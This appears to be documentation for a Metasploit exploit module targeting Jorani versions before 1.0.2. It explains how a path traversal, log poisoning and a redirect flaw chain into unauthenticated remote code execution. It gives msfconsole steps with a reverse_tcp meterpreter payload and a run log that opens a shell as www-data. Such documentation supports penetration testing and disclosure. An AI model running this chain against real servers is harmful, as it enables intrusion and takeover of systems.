## Vulnerable Application

Jorani prior to 1.0.2 allows unauthenticated remote malicious users to execute arbitrary code.

This is due to a lack of sanitization on language parameter, that can lead to file inclusion of ".php" files.

Moreover, the log file for jorani ends with ".php" in Jorani < 1.0.2.

Log poisonning is possible, so an authenticated attacker can execute arbitrary code.

Finally, the controller responsible for recovering a page doesn't properly redirect requests made by Ajax.

So by chaining theses 3 vulnerabilities an unauthenticated user can execute arbitrary code on the application.

This module has been tested successfully on Jorani 1.0.0, Ubuntu 20.04 (x86_64) with kernel version 5.15.0-75.

## Verification Steps
1. Start `msfconsole`
2. `use exploit/multi/php/jorani_path_trav`
3. set `RHOSTS` and `RPORT`
4. Confirm the target is vulnerable: `check`. The result expected is `The target appears to be vulnerable.`
5. Default payload for the exploit will be `php/meterpreter/reverse_tcp`
6. set `LHOST`
7. `exploit`
8. Confirm you have now a cmd session

## Options

### TARGETURI (optional)
The path to the jorani website. By default it is empty.

## Scenarios

```
msf6 exploit(multi/php/jorani_path_trav) > run

[-] Handler failed to bind to 172.31.3.1:9898:-  -
[*] Started reverse TCP handler on 0.0.0.0:9898
[*] Trying to exploit LFI
[*] Recovering CSRF token
[+] CSRF found: 3ff4c712b884e3f577d9c3f65adac16f
[*] Poisonning log with payload..
[*] Sending 1st payload
[*] Including poisonned log file log-2023-06-27.php
[+] Triggering payload
[*] Sending stage (39927 bytes) to 10.0.2.2
[*] Meterpreter session 1 opened (10.0.2.15:9898 -> 10.0.2.2:46898) at 2023-06-27 19:21:28 +0200

meterpreter > getuid 
Server username: www-data
```

